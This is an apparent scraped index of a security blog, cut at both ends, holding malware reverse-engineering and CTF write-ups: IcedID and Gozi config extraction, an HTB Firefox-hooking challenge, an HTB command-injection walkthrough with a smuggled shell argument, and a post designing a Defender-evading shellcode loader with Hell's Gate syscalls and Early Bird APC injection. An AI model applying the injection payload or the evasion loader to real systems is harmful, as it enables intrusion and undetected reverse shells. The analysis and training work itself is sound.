callback function seems to just get a handle to a windows, then it enters a function that seems to be doing some type of memory copying operations.\nFollowing along some of the function calls results in finding what seems to be a promising function. It seems to create a string |SPL| Doing some OSINT reveals that this might be an IoC for SplPacker.\nThere is also a string DllRegisterServer that is created dynamically, so thats something else to watch out for. Since it seems that this is modifying memory and potentially unpacking something, I figured it might be easier at this point to just reverse this part dynamically. Also, Binja isn\u0026rsquo;t correctly deducing the function calls to these resolved APIs, so we need to define them ourselves and then change their type. We can do this by creating new types:\nI quickly arrive at a function that is doing some type of hashing. It doesn\u0026rsquo;t specify what type of hashing to do, so the process will use the default value, which I am unsure of what it would be. ChatGPT says this would be using PROV_RSA_FULL.\nWhen stepping through x64dbg, I saw it was using ALG_ID of 8003 which corresponds to md5. Also, I am able to obtain a few more hashes:\nAlso, as I stepped through some of the functions I found what looked to be RC4 encryption algo. This assumption was based on the fact that it had 3 loops, each with 256 iterations, which matches up with the profile of RC4.\nDecryption There are 2 references to this RC4 function, so I labeled them as potential decryption functions. In both of these references, a key of 0x11c742c6 is used. There is also another function that does some type of encryption or encoding using the same data, key, and key length, although I wasn\u0026rsquo;t able to understand it at the time. Additionally, from the references to the data and key, I was able to deduce that the code is using this structure:\n1 2 3 4 struct data_block { PVOID pdata; uint64_t data_len; } It passes references to this structure to its encryption routines.\nAt this point, I felt that it would be easier to see how these functions are used from x64dbg, so I went back to it. I ended up putting an access breakpoint on the data section, so i could see when the hex strings start getting used. Through this method I was able to figure out the following chunk of data was some type of metadata about the hexstream in the .data section.\nAlso, the hex stream is converted from hex to bytes, and then copies into the section created by NtCreateSection earlier in the process. Then the data is hashed several times, maybe to verify its integerity. It was also at this point where I realized that the function that I had thought to be encoding was actually a second type of decryption that is applied to the data after it has been passed through the RC4 routine. The strategy I used to do this was to check for instructions that moved data from either a stack variable or process memory to a register or vice versa. Another hint was that this also used the same parameters as the RC4 function. Then you see the operations that are done upon it. The authors of this malware use an obfuscation technique in this encryption where they add values, and then subtract them, essentially restoring the original value. The obfuscated formula for the xor encryption is:\n1 2 3 4 5 data[i] = (data[i] ^ key[i % len(key)]) data[i] -= data[i + 1] data[i] += 0x100 - 0x100 data[i] += (i % len(key)) \u0026amp; 0xFF data[i] -= (i % len(key)) \u0026amp; 0xFF which simplifies down to:\n1 data[i] = (data[i] ^ key[i % len(key)]) - data[i + 1] Because python treats the operands of these operations as signed integers we also need to add a mask of 0xFF to cut the resulting byte/s to the right size.\nWe can copy these unpacking process in binary ninja with the following script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 from binaryninja import Transform, BinaryReader ADDR_OF_DATA = 0x7fff7a1a9040 KEY = 0x11c742c6 FILENAME = \u0026#34;\u0026#34; def get_data(hexstream_addr): br = BinaryReader(bv, address=hexstream_addr) data = \u0026#34;\u0026#34; curr = br.read(2) while curr != b\u0026#34;\\x00\\x00\u0026#34;: data += curr.decode(\u0026#34;utf-8\u0026#34;) curr = br.read(2) data = bytes.fromhex(data) return data def rc4_decrypt(data, key=KEY): key = key.to_bytes(4, byteorder=\u0026#34;little\u0026#34;) rc4 = Transform[\u0026#34;RC4\u0026#34;] return rc4.encode(data, {\u0026#34;key\u0026#34;: key}) def xor_decrypt(data, key=KEY): data = bytearray(data) key = key.to_bytes(4, byteorder=\u0026#34;little\u0026#34;) for i in range(len(data) - 1): b = data[i] ^ key[i % len(key)] b -= data[i + 1] b \u0026amp;= b \u0026amp; 0xFF data[i] = b return data def unpack(hexstream_addr): data = get_data(hexstream_addr) data = rc4_decrypt(data) data = xor_decrypt(data) with open(FILENAME, \u0026#34;wb\u0026#34;) as f: f.write(data) return True unpack(ADDR_OF_DATA) This script leaves us with a big ole dump file. But it is progress :)\nIf we go back to binja with all the new information we picked up from dynamic analysis, and and follow what happens after this decryption function is called, we will see that the unpacked data is parsed for the string \u0026ldquo;|SPL|\u0026rdquo;.\nIf we search for this value ourselves, we can see that it is used as a seperator. There are 5 payloads that are in this dump.\nI placed each in HxD and used their magic bytes to determine what they are. The first is some stub code that was jumped to from the main process. I saw this in x64dbg when tracking the NtCreateSection api call. The second one might be a compressed PE file, cuz I can see a PE header, but I\u0026rsquo;ll analyze that in Binja soon. The third is a full PE file. Windows defender was able to recognize it as malware, so this is probably the payload the contains the config we want. Section 4 was a .jfif file, that contain an image of a lion emblem. I\u0026rsquo;ll do some analysis on that in a bit in case it contains anything interesting inside the image. Section 5 was a jpeg of a drawing of a woman.\nDumped PE This PE is a lot easier to read. It will immediately create a thread, with THREAD_CREATE_RUN_IMMEDIATELY. There is a call to Sleep which we can get rid of to speed up analysis. Then we almost immediately hit the decryption routine that reveals the C2 address we have been hunting for.\nIn this case it was: ilekvoyn.com. Continuing through the code, it becomes clear that it is crafting a URL request to this address. It uses a cookie value obtained early from querying something in our kernel. Then adds in the result of GetSysCount64 / 1000, then adds in some other values. Since this is a quick challenge, and an old sample I did not bother seeing what how the value was being generated, but I can assume safely assume it\u0026rsquo;s likely something unique to our infection.\nAnyways, the goal of this challenge was to unpack and grab the c2 address, and we have enough information to do that. We just need to combine our unpacking script with the string decryption, and we should be good.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from binaryninja import BinaryReader import re def xor_decrypt(data_addr): br = BinaryReader(bv, address=data_addr) data = br.read(0x80) config = b\u0026#34;\u0026#34; for i in range(0x20): config += (data[i] ^ data[i + 0x40]).to_bytes(1, \u0026#34;little\u0026#34;) return config def extract_url_from_bytes(byte_string): extracted_ascii = b\u0026#34;\u0026#34; for byte in byte_string: if 32 \u0026lt;= byte \u0026lt;= 126: extracted_ascii += bytes([byte]) extracted_ascii = extracted_ascii.decode(\u0026#34;utf-8\u0026#34;) pattern = re.compile(\u0026#39;.*com\u0026#39;) url = pattern.search(extracted_ascii) return url.group(0) config = xor_decrypt(0x7ffc97718000) url = extract_url_from_bytes(config) print(f\u0026#34;[*] C2 Address -\u0026gt; {url}\u0026#34;) I could have automated the entirety of this, but its an old sample so I don\u0026rsquo;t wanna put a ton of effort into something that may only be valid for this sample, so instead I\u0026rsquo;ll move onto a fresh upload, maybe agent tesla :D\nYou can find all the scripts I used HERE\n","date":"2023-12-01T02:45:01-07:00","image":"https://Kvn11.github.io/p/icedid-malware-config-extraction/img/cover_hu2a9a7507b16ac1277fd064f96fac5ec6_49860_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/icedid-malware-config-extraction/","title":"IcedID Malware config extraction"},{"content":"Sample Info 0a66e8376fc6d9283e500c6e774dc0a109656fd457a0ce7dbf40419bc8d50936\nUnpacking The dll is loaded at 0x400000 in x32dbg. We can set breakpoints at VirtualAlloc and VirtualProtect to catch any regions of memory where the desired payload will be unpacked to. This method will show that VirtualAlloc is called 3 times. The first contains some encrypted or encoded data, and isn\u0026rsquo;t very useful to us. The second call will allocate at x0dF0000 where a mangled PE gets written to. The third call is interesting because it comes from the PE file written to the second allocation.\nThis third allocation is made at 0x2BC0000 and also contains a PE file, but its headers are not mangled like the first. We can dump this one to take a look. Alternatively, you can also go through the VirtualProtect calls. This PE will be used to overwrite the running process. After the last VirtualProtect, you can dump the original process memory and you\u0026rsquo;ll have the same bin file.\nAt this point, I wasn\u0026rsquo;t sure if this was the last stage or not, so I continue in x32dbg in case I ran into more VirtualAlloc or HeapAlloc but pretty soon realized this was the main module. The sample will use local APC injection to run some threads to decrypt the config we want and a few other tasks. For the sake of brevity I will skip pass that process, but if you wanted to repeat it, you could set a break point at the call to CreateThread (0x402020), and once you get there, change the EIP to point to the thread payload, which should be 0x401b7f. After locating the code that was decrypting the config data in .bss, I was able to continue the reversing process in Binary Ninja.\nReversing Decryption Routine The decryption process is pretty straightforward from here. First, a base of 0 is established. Then the key is subtracted from this base. Then this new value (base - key) is added with the dword of data being decrypted. Then the decrypted data is written to a buffer. This loop will happen a max of 0x400 times, or until the data grabbed is 0.\nThe pseudo code could be understood as:\n1 2 3 4 5 6 7 8 9 10 result = \u0026#34;\u0026#34; prev = 0 for i in range(0x400): dword = encrypted_data[ i*4 : (i*4) + 4 ] if dword == 0x0: break x = prev - key decrypted_dword = x + dword result += decrypted_dword Key generation Figuring out the key is a bit more tricky.\nStepping through x32dbg I was able to figure out the formula to be:\n1 key = \u0026#39;Apr \u0026#39; + \u0026#39;26 2\u0026#39; + \u0026lt;.bss rva\u0026gt; + some int - 1 Some int is a value picked up from calling NtQuerySystemInformation and grabbing a dword from it. The value itself doesn\u0026rsquo;t matter, because that value is divided by 0x13 and only the remainder is used, and then two values, the NTSTATUS return value and 1, are added to it. STATUS_SUCCESS is defined as 0x0, so as long as NtQuerySystemInformation succeeds, we are only really adding 1 to our remainder. Hence the possible values of this mystery integer are 1 - 0x14.\nFinal Script Through a little brute force, you can figure out that the secret value is supposed to be 18. Here\u0026rsquo;s the final script I used, its meant to be ran with Binja.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from binaryninja import BinaryReader def decrypt_strings(secret_sauce): bss = bv.get_section_by_name(\u0026#34;.bss\u0026#34;).start br = BinaryReader(bv, address=bss) rva = bss - bv.start # TODO: Get key dynamically key1 = int.from_bytes(b\u0026#34;Apr \u0026#34;, \u0026#34;little\u0026#34;) key2 = int.from_bytes(b\u0026#34;26 2\u0026#34;, \u0026#34;little\u0026#34;) key = key1 + key2 + rva + secret_sauce prev = 0x0 curr = int.from_bytes(br.read(0x4), \u0026#34;little\u0026#34;) data = b\u0026#34;\u0026#34; for _ in range(0x400): if curr == 0x0: break result = (prev - key + curr \u0026amp; 0xffffffff).to_bytes(4, \u0026#34;little\u0026#34;) data += result prev = curr curr = int.from_bytes(br.read(0x4), \u0026#34;little\u0026#34;) return data print(decrypt_strings(18)) ","date":"2023-11-27T02:45:01-07:00","image":"https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/img/cover_hufd045887b53cb3360ed141f9d234bb22_75842_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/gozi-malware-unpacking-and-config-extraction/","title":"Gozi malware unpacking and config extraction"},{"content":" Challenge Description: After more and more recent hits of the infamous Jupiter Banking Malware we finally managed to get a sample of one module. Supposedly it steals secrets from Firefox users?\nInitial Analysis PEBear show little to no imports so I can assume that the import table is being obfuscated or functions are being dynamically imported at runtime. Also, based on the challenge description I think I can probably find the flag once I figure out exactly what it is doing with FireFox, or what secrets it is stealing.\nIDA The main function is pretty straightforward. A payload is decrypted via single byte XOR decryption routine, then the payload is injected into a remote thread in the Firefox process.\nSince the decryption is so simple, I just ran through the decryption, then patched the executable using HxD to contain the original payload.\nNow we can view the decrypted payload in IDA. The first line of code seems to get a pointer to some loaded DLL, then search through its function names until it finds the one that has the inverted CRC checksum of 0x43AAC47D which uninverted is 0xBC553B82. This is definitely some form of dynamic API importing.\nNtCurrentTeb() will return a pointer to a TEB structure.\n1 2 3 4 5 6 7 8 9 10 11 12 typedef struct _TEB { PVOID Reserved1[12]; PPEB ProcessEnvironmentBlock; PVOID Reserved2[399]; BYTE Reserved3[1952]; PVOID TlsSlots[64]; BYTE Reserved4[8]; PVOID Reserved5[26]; PVOID ReservedForOle; PVOID Reserved6[4]; PVOID TlsExpansionSlots; } TEB, *PTEB; This structure is then used to access the Process Environment Block, which as you can guess contains process information.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; PVOID Reserved4[3]; PVOID AtlThunkSListPtr; PVOID Reserved5; ULONG Reserved6; PVOID Reserved7; ULONG Reserved8; ULONG AtlThunkSListPtr32; PVOID Reserved9[45]; BYTE Reserved10[96]; PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine; BYTE Reserved11[128]; PVOID Reserved12[1]; ULONG SessionId; } PEB, *PPEB; Then the Ldr structure is grabbed which contains information about the loaded modules:\n1 2 3 4 5 typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; The InMemoryOrderModuleList is just a doubly linked list of the modules that are loaded into the process. So this code is parsing through the loaded modules until it finds the one it wants, which it assumes will always be at the same location. What module is this? In order to find out, we have to use x64dbg to run through this process until it write the payload over the Firefox process memory space, attach to the firefox process, and run the code until we find the module it wants.\nRemote Thread So I boot up x64dbg, set breakpoints at OpenProcess, VirtualAllocEx, and VirtualProtectEx. The reason I don\u0026rsquo;t break at CreateRemoteThread is because I will create the thread myself. Why would I do that? I was having trouble with attaching to the thread that ffmodule creates, and just found it was easier this way. Just make sure you note down the handle you get from OpenProcess and the address that VirtualAllocEx gives you so you attach to the correct process and then are able to set a break point at the correct spot (which in my case was 0x00000182CC7F0000).\nThen we continue until the instruction right after VirtualProtectEx since at this point the payload is written, and can be executed in the remote process.\nNow we just head over to the Handles tab to find the PID for our handle, and attach to the process. Then head over to the address we got from VirtualAllocEx. We know we got the right address because the instructions here will match the instructions from the decrypted payload in ghidra.\nNow we can create the thread manually with the createthread \u0026lt;payload_addr\u0026gt; command, and switch to it with the switchthread \u0026lt;thread_id\u0026gt; command. You won\u0026rsquo;t see the thread right away, first you need to run until return. Then the thread should show up in your Threads tab. Then we can continue until we are at the start of our payload. Now I set breakpoints at the crc instruction so I can what function name its comparing as well as when it breaks. When it breaks it will tell us the function it has imported.\nHowever, I\u0026rsquo;d rather just know right away so I rebuilt the functionality in lil cpp tool.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // g++ -o api api.cpp -msse4.2 #include \u0026lt;immintrin.h\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstring\u0026gt; unsigned int custom_crc32_u8(const char* data, size_t length, unsigned int crc) { for (size_t i = 0; i \u0026lt; length; i++) { crc = _mm_crc32_u8(crc, data[i]); } return crc; } int main() { const char* names[] = { \u0026#34;functionNames\u0026#34;, }; unsigned int initial_value = 0xFFFFFFFF; for (const char* name : names) { unsigned int crc = custom_crc(name, strlen(name), initial_value); if ( ~crc == 0x43AAC47D) { std::cout \u0026lt;\u0026lt; \u0026#34;~CRC-32 for \u0026#39;\u0026#34; \u0026lt;\u0026lt; name \u0026lt;\u0026lt; \u0026#34;\u0026#39;: 0x\u0026#34; \u0026lt;\u0026lt; std::hex \u0026lt;\u0026lt; crc \u0026lt;\u0026lt; std::dec \u0026lt;\u0026lt; std::endl; break; } } return 0; } I was able to get the function names from this page with the following python script:\n1 2 3 4 5 6 7 8 9 10 import requests from bs4 import BeautifulSoup URL = \u0026#34;https://www.geoffchappell.com/studies/windows/win32/kernel32/api/\u0026#34; resp = requests.get(URL) h = resp.text soup = BeautifulSoup(h, \u0026#39;html.parser\u0026#39;) fns = [tag.text for tag in soup.find_all(\u0026#39;span\u0026#39;, class_=\u0026#39;function\u0026#39;)] print(fns) Now we can see that it wants GetProcAddress. It then goes on to resolve VirtualAlloc\nIt should be noted that these addresses are being stored in R12 and R15 respectively.\nWe can follow the returned address in dump to monitor any changes to this region. Then it resolves VirtualProtect but stores that one on the stack. Then its time for another api hashing sesh, but this time against the loaded modules. Specifically, it wants 3 more modules:\n1 2 3 8861D80B 3DCE28A2 83BCBE6A We can export a list of the loaded modules from x64Dbg and parse them with python, and then run them through our hashing cpp code. Using this method I see that 0x3DCE28A2 corresponds to NSS3.dll, and 0x8861d80b is for the lowercase version. I\u0026rsquo;m guessing the third hash is just a fake to try and dupe the analyst. After it gets the base address of this module, it gets the address for PR_Write. Firefox docs have the following for this call:\n1 2 3 4 PRInt32 PR_Write( PRFileDesc *fd, const void *buf, PRInt32 amount); After getting the address for this function, it is placed in R15, overwriting the pointer to VirtualAlloc. Then the code from PR_Write is copied into the allocated memory from before. Seems like a copy is being made, probably for a hook. Later, the code from PR_Write is saved to the previously allocated buffer. There is check to stop when it finds certain instructions contained in RBX but it never finds them , leading it to write to out of bounds so I just manually made it pass the check. Then it changes permissions on the copied instructions to PAGE_EXECUTE_READ. Then the memory at the real PR_Write has its permissions changed to PAGE_EXECUTE_READWRITE.\nThen the start of PR_Write is overwritten with the bytes: 4155415449BC which corresponds to the instructions. A comparison of the before and after is shown here:\nThe final hooked function looks like this:\nIf we follow the hook, we end up at a function that has a check for RBX being less than or equal to 4. On a matching condition, the hook exits, so I nopped it. Then it checks if the value pointed at by RDX is equal to the command STOP. If its not equal it will also exit. So we jump over that and continue. I also have intuition to continue here because I see another hashing loop later on down this path, so I\u0026rsquo;m curious to see what comes out of it. It turns out to be wanting WS_32.dll.\nEndgame So I forgot to take screenshots when I solved it, and I don\u0026rsquo;t feel like going through the challenge again to get them, so I\u0026rsquo;ll just summarize what ended up happening. I set a breakpoint at the PR_Write function, and waiting until it was hit with data. Once the data was hit, the data gets encrypted. The encryption depends on a key generated from bytes right before the encryption routine, and the amount of bytes read from that area depend on the size of the data being encrypted. Regardless of the size, the first 32 bytes of the key will always be the flag. The key generation and encryption takes a minnnn to complete if you are stepping through with breakpoints, we can modify the call to PR_Write size parameter to 32, which will make the flag appear one byte at a time before they are used to encrypt the data.\n","date":"2023-11-06T02:45:01-07:00","image":"https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-rev-challenge-ffmodule/","title":"HTB REV Challenge FFModule"},{"content":" Challenge Description: Welcome to the Prying Eyes, a \u0026ldquo;safe space\u0026rdquo; for those curious about the large organisations that dominate our life. How safe is the site really?\nWalkthrough The challenge involves what seems to be a leaks forum / marketplace, very reminiscent of RaidForums (RIP).\nOther than some interesting posts, doesn\u0026rsquo;t seem to be much else so I moved on to source code review at this point. Right away, I noticed that one of the pages was using Imagemagick which is known to have tons of vulnerabilities.\nImagemagick-convert is just a JavaScript interface for the convert CLI tool from Imagemagick, which according to the Dockerfile from the challenge is version 7.1.0-33.\nA little googling brings us to this exploit. Generating the exploit is pretty straightforward, just follow the instructions from the script.\nNow its important to note that the file read is only accessible if the output file of the convert operation is a png. I got stuck on this for quite a while, but looking at the source code for the forum revealed another vulnerability.\nThe fact that we can pass in our own arguments through intercepting the post request implies there is an argument that we can use that will allow us to change the output file format. The source code for the convert function can be found here\nimagemagick-convert The code pretty much just creates a command string that is then passed to a command process. The data from the uploaded image is passed through standard input, and our options are concatenated together. The intended command string is supposed to look like this:\n1 convert \u0026lt;args\u0026gt; - AVIF:file_name However, since it just concats whatever is passed to it without much processing, it allows for command injection. The output file name is the last arg to be concated to the string, so we just need an option that occurs before it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 /** * Create occurrence * @param {string|null} format * @param {string|null} name * @returns {string} */ createOccurrence(format = null, name = null) { const occurrence = []; if (format) occurrence.push(format); occurrence.push(name || \u0026#39;-\u0026#39;); return occurrence.join(\u0026#39;:\u0026#39;); } For this purpose the srcFormat option will work, especially because it is the argument that is inserted right before the output file name. At this point I realized that I probably don\u0026rsquo;t have to use the built in vulnerability in the Imagemagick module, and could probably just use the command injection I have here to spawn a shell or use mv to copy the flag to the output directory, but the convert tool has a -write option that just simplifies everything so that is the reason I ended up not using a more sophisticated command injection payload. Anyways, we will insert the following into the srcFormat parameter:\n1 png:- -write uploads/flag ; echo The space after flag and the ; echo are important in order to break up the original command and prevent any errors from breaking our injection. The final command thats runs server side would be:\n1 convert \u0026lt;args\u0026gt; png:- -write uploads/flag ; echo AVIF:file_name Then we can download the flag, and use exiftool -b to extract the flag from the image :).\n","date":"2023-10-29T02:46:01-07:00","image":"https://Kvn11.github.io/p/htb-web-prying-eyes/img/hackthebox_hud104239935165a44571788a9c3d01fba_34890_120x120_fill_q75_box_smart1.jpg","permalink":"https://Kvn11.github.io/p/htb-web-prying-eyes/","title":"HTB WEB Prying Eyes"},{"content":"Opening Thoughts Over the past couple months I have gone through the Zero2Automated malware RE course, and the Malware Development course from MalDev Academy. The malware RE course is pretty easy to practice as there are plenty of samples and challenges online to reverse, but finding a challenge for malware development is a bit trickier. Fortunately, I ran into some problems while studying for the OSCP exam and doing HackTheBox. Many of the boxes running Windows 10 were able to detect msfvenom, mimikatz, and other malicous powershell scripts which made it very difficult to get a reverse shell on what should have been very simple boxes. The OSCP teaches to use Shellter, but even this tool was failing to bypass Defender. At this point I figured it\u0026rsquo;d be a good investment to build my own loader so that I wouldn\u0026rsquo;t ever have to worry about this issue again. I had actually done this project once in C++, but hindsight is 20/20 and I arrived at the conclusion that writing it in C is the best option. My reasoning is that a loader isn\u0026rsquo;t super complicated, so the organization and object oriented approach that C++ offers doesn\u0026rsquo;t really offer any benefit. And the added overhead from C++ just makes the final executable larger. Since I\u0026rsquo;ll be working on boxes where the network bandwidth isn\u0026rsquo;t great, a small and portable executable is better.\nDesign I was talking to this one person who\u0026rsquo;s been developing game cheats for over 10 years and he told me that all you really need is memory injection and streaming relocations. Streaming relocations is a bit overkill for this project, so I\u0026rsquo;ll skip that but the injection is definitely optimal. In the first version I had used APC injection, and ran into issues with my shell dying once the original process terminated. I\u0026rsquo;m sure I could fix it, but since this is supposed to be an improvement over my 1.0 loader I want to go with remote APC injection, aka Early Bird APC injection. I will also need a quick and easy way of hashing strings, and encrypting my msfvenom payloads. For these requirments I\u0026rsquo;ll just use the same code snippets as taught in the MalDev course since crypto isn\u0026rsquo;t one of my strengths.\nHell\u0026rsquo;s Gate Window\u0026rsquo;s syscall\u0026rsquo;s are the API\u0026rsquo;s that carry out the actions when a WinAPI is called. The example given in the course is that VirtualAlloc and VirtualAllocEx use the NtAllocateVirtualMemory to carry out their actions. All the syscalls return an NTSTATUS value that indicates an error code. We can use the following docs since most syscalls aren\u0026rsquo;t documented by Microsoft:\nUndocumented NTInternals ReactOS\u0026rsquo;s NTDLL Reference The main advantage to using syscalls is that we can evade hooked WinAPI. Syscalls will have the following structure:\n1 2 3 mov r10, rcx mov eax, SSN syscall SSN referes to the syscall service number that the kernel uses to distinguish one syscall from another. It\u0026rsquo;s important to note that these values will differ for the same syscall across different OS and OS versions.\nHell\u0026rsquo;s Gate is a technique that can read through ntdll.dll to find and execute syscalls. It\u0026rsquo;s a pretty complex technique that I won\u0026rsquo;t go over here since that isn\u0026rsquo;t the purpose of this post. But you can read about it here. We can follow the guidance in that paper to get the technique working. Long story short, we will add a VX_TABLE_ENTRY to our VX_TABLE for every syscall we want to use:\n1 2 3 4 5 6 7 8 9 10 typedef struct _VX_TABLE_ENTRY { PVOID pAddress; DWORD dwHash; WORD wSystemCall; } VX_TABLE_ENTRY, * PVX_TABLE_ENTRY; typedef struct _VX_TABLE { VX_TABLE_ENTRY NtCreateUserProcess; VX_TABLE_ENTRY \u0026lt;some_syscall\u0026gt;; } This table will be populated via the GetVxTableEntry(...) function given in the paper.\nThen HellsGate function just loads up the correct SSN to be called, and then HellDescent actually makes the call:\n1 2 HellsGate(g_Sys.NtSyscallEntry.wSystemCall); HellDescent(arg1, arg2, arg3, ...); Early Bird APC Injection Asynchronous Procedure Calls (APC\u0026rsquo;s) are functions that execute async in the context of a specific thread. We can queue an APC to a thread, and the next time the thread is scheduled, it will run the APC function. In order to run an APC generated by an application, the thread we use must be in an alertable state, which just means that it is in a \u0026ldquo;wait\u0026rdquo; state. The early bird part of this technique just refers to a remote process instead of the local one. So we would do the following:\nSpawn process in suspended state. Write payload to address space of suspended process. Get a handle to the suspended thread. Pass in address of payload new address, and handle to QueueUserAPC. Resume thread and wait for payload to run. Something interesting to note is that normally you\u0026rsquo;d spawn the process like this:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 BOOL CreateProcessA( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation ); CreateProcessA( NULL, lpPath, NULL, NULL, FALSE, DEBUG_PROCESS // dwCreationFlags, NULL, NULL, \u0026amp;StartupInfo, \u0026amp;ProcInfo) However I am using the syscall NtCreateUserProcess, so I need to use a slightly different calling convention.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess \u0026amp; NtCreateThreadEx HellsGate(g_Sys.NtCreateUserProcess.wSystemCall); HellDescent( hProcess, hThread, PROCESS_ALL_ACCESS, NULL, NULL, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, UppProcessParameters, \u0026amp;psCreateInfo, pAttributeList ); To learn more about how NtCreateUserProcess works I recommend this blog.\nNow we just write our payload into the memory space of this process. For this, we need to update our syscall table structure with 3 more syscalls:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 typedef NTSTATUS(NTAPI* fnNtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, ); typedef NTSTATUS(NTAPI* fnNtProtectVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, PULONG NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccesProtection ); typedef NTSTATUS(NTAPI* fnNtWriteVirtualMemory)( HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten ); Anti-Sandbox ","date":"2023-10-20T02:45:01-07:00","image":"https://Kvn11.github.io/p/windows-shellcode-loader-in-c/img/cover_hu2b7ef2eb33007bfd8f3ce0e8fba06270_1162734_120x120_fill_box_smart1_3.png","permalink":"https://Kvn11.github.io/p/windows-shellcode-loader-in-c/","title":"Windows Shellcode Loader in C"},{"content":" Challenge Description: While cleaning up the workspace of a recently retired employee, we noticed that one of the core files of the very important programs they were working on didn\u0026rsquo;t match up with the backups we have of it, could you check it out for us?\nInitial Analysis Upon running the executable, nothing out of the ordinary seemed to happen. The .exe printed \u0026ldquo;Hello World!\u0026rdquo; and exited normally. PEBear showed that there was another strange section in the exe file called .ivir. I made the assumption that this was a reference to I terative VIRus, and the entry point being in this section further reinforced my theory that this was the \u0026ldquo;virus\u0026rdquo; part of the file. The time stamp was set to deadc0de which was also strange, since that translates to a date well into the future.\nReversing with IDA Free The first interesting function to look at is one that returns a function name based on a number it is given. It uses stack strings to prevent analysis tools from detecting the string as a string. We can right click on the hex values to convert them to characters. The result name is then passed to another function that seems to return a function pointer. This made me think that the exe was dynamically resolving functions.\nAfter we sort through each function call and match up the result, we can see the functions that have been resolved:\nAfter these functions have been resolved, there is a value 5 bytes after the entry point that is compared. If the value is 5, then a function is called. However, this function seems to be broken, encrypted, or heavily obfuscated since the disassembly doesn\u0026rsquo;t seem valid. Otherwise, what seems like a key value is chosen and saved.\nThen the exe will iterate over all the *.exe files in its current directory, confirm some checks, and if everything looks good it will perform some actions on the current .exe file. The main check is that the timestamp of the file needs to be set to THIS otherwise the infection of the file will not take place.\nMost the proceeding infection process isn\u0026rsquo;t super important, and was in fact pretty tedious to look through and rename. A new section and section header are added and modified to make sure they adhere to alignment rules, and the rest of the process is just copying over the infection code and making it so it replaces the entry point of the victim file.\nThe end of the process loops over the data from the broken function from earlier, and multiplies it against the key value selected earlier. This new modified code is then copied into the victim file. Then the byte 5 bytes ahead of the entry point is incremented and copied into the victim file. This means when the newly infected victim exe is run, it will use the second key. Then the next file to be infected will use the third key, and so on until the 4th iteration when that special byte is set to 5. At that point the strange function from earlier runs. This implies that after a certain number of infections the strange function reveals itself. I verified most of this with dynamic analysis as well, but didn\u0026rsquo;t take any screenshots. If you want to verify with a debugger, set a breakpoint after the MapViewOfFile function and follow it in dump. From there you can follow along with the exe code as it checks and modifies different parts of the victim file.\nI ran the exe in x64Dbg, and copied out the encrypted code so I could manually decrypt it. You could just manipulate the registers to do it all within x64Dbg but I ran into exceptions doing that so I opted for the python approach. Here is the script that decrypts the flag function:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 code = [ 0xE25C0FE4937ECD98, 0x46943D7D6211854C, 0x7ED9FD7403244F3B, 0x0954450DD34BC4FB, 0x34738E7E3DC62246, 0x382DF5BC3CDDD484, 0x138529F69C81C398, 0xE9FCF6D4DD85105E, 0x5B977D744A5DBD4C, 0xC2D93D4B963E5C85, 0xB3DD747A06D5A985, 0xD454843DE2F28EBF, 0x0215CEB076580EDC, 0x3F55D6792852AA4D, 0x17AF0A0E48DDD484, 0x547EA605BB8640AD, 0x243D8A75B199B575, 0x27D1C0EDAE5CB998, 0x6108284AE5787878, 0x7E49F4DF10792485, 0xACD9F651E2F28EBF, 0xADA04BA5BA8A1444, 0xF77252CAFD2A38C9, 0x388BB9FB9D000000, 0x8CC468D4A37B0000, 0x891DB54E4E4ABD4C, 0xEFCE883F2C030000, 0x399F79C914778100, 0xB5B1F45FAD045A5C, 0xB721A6D9B394FF4C, 0xB0DE9DB43DD7A1B3, 0xCC3AF2334A813038, 0x3DD6D4E506470273, 0x339B093AB6A0F837, 0x3E997481AE05CCA5, 0x689018943160B8AC, 0xE35AE4EDCF035760, 0x6D46B194A1A37B36, 0x3619E5691F021894, 